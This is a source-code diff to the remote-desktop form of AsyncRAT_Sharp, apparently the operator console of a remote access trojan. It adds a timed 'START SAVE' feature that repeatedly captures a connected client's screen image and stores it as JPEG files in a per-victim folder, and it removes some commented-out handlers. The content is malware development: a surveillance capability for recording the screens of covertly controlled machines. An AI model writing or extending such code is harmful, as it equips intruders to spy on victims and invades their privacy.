@@ -13,6 +13,9 @@ using System.Windows.Forms;
 using AsyncRAT_Sharp.Sockets;
 using AsyncRAT_Sharp.MessagePack;
 using System.Threading;
+using System.Drawing.Imaging;
+using System.IO;
+using Encoder = System.Drawing.Imaging.Encoder;
 
 namespace AsyncRAT_Sharp.Forms
 {
@@ -92,22 +95,51 @@ namespace AsyncRAT_Sharp.Forms
         {
             button2.Left = pictureBox1.Width / 2;
         }
-        //private void RemoteDesktop_Activated(object sender, EventArgs e)
-        //{
-        //    //if (Active == false)
-        //    //{
-        //    //    Active = true;
-        //    //    MsgPack msgpack = new MsgPack();
-        //    //    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-        //    //    msgpack.ForcePathObject("Option").AsString = "true";
-        //    //    ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
-        //    //    decoder = new UnsafeStreamCodec(60);
-        //    //}
-        //}
 
-        //private void RemoteDesktop_Deactivate(object sender, EventArgs e)
-        //{
-        //   // if (Active == true) Active = false;
-        //}
+        private void BtnSave_Click(object sender, EventArgs e)
+        {
+            if (timerSave.Enabled)
+            {
+                timerSave.Stop();
+                btnSave.Text = "START SAVE";
+            }
+            else
+            {
+                timerSave.Start();
+                btnSave.Text = "STOP SAVE";
+            }
+        }
+
+        private void TimerSave_Tick(object sender, EventArgs e)
+        {
+            try
+            {
+                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID + "\\RemoteDesktop");
+                if (!Directory.Exists(fullPath))
+                    Directory.CreateDirectory(fullPath);
+                Encoder myEncoder = Encoder.Quality;
+                EncoderParameters myEncoderParameters = new EncoderParameters(1);
+                EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 50L);
+                myEncoderParameters.Param[0] = myEncoderParameter;
+                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
+                pictureBox1.Image.Save(fullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", jpgEncoder, myEncoderParameters);
+                myEncoderParameters?.Dispose();
+                myEncoderParameter?.Dispose();
+            }
+            catch { }
+        }
+
+        private ImageCodecInfo GetEncoder(ImageFormat format)
+        {
+            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
+            foreach (ImageCodecInfo codec in codecs)
+            {
+                if (codec.FormatID == format.Guid)
+                {
+                    return codec;
+                }
+            }
+            return null;
+        }
     }
 }
